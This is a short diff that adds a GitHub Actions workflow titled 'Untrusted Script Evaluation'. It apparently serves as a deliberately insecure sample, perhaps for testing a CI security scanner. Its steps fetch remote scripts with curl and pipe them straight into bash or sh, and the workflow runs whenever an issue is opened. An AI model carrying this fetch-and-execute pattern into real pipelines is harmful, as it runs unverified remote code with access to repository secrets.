@@ -1,0 +1,13 @@
+name: Untrusted Script Evaluation
+on:
+  issues:
+    types: [opened]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: bash <(curl https://codecov.io/bash)
+      - run: |
+          SRC=$(curl https://example.com/404)
+          echo $SRC | sh
